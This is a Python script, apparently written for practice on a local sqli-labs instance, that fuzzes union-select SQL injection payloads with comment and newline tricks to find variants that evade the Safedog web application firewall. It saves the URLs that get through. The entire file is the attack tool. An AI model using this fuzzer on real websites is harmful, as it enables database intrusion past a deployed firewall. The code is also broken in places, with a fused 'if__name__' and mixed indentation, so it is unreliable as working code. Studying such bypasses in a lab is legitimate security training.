import requests,time

url='http://127.0.0.1:8080/sqli/Less-2/?id=-1'
union='union'
select='select'
num='1,2,3'
a={'%0a','%23'}
aa={'x'}
aaa={'%0a','%23'}
b='/*!'
c='*/'
def bypass():
	for xiaodi in a:
		for xiaodis in aa:
			for xiaodiss in aaa:
				for two in range(44500,44600):
					urls=url+xiaodi+xiaodis+xiaodiss+b+str(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiaodiss+num
					#urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xiaodiss+num
					try:
						result=requests.get(urls).text
						len_r=len(result)
						if (result.find('safedog')==-1):
							#print('bypass url addreess：'+urls+'|'+str(len_r))
							 print('bypass url addreess：'+urls+'|'+str(len_r))
						if len_r==715:
                             fp = open('url.txt','a+')
                             fp.write(urls+'\n')
                             fp.close()
					except Exception as err:
						print('connecting error')
						time.sleep(0.1)

if__name__=='__main__':
	print('fuzz strat!')
	bypass()


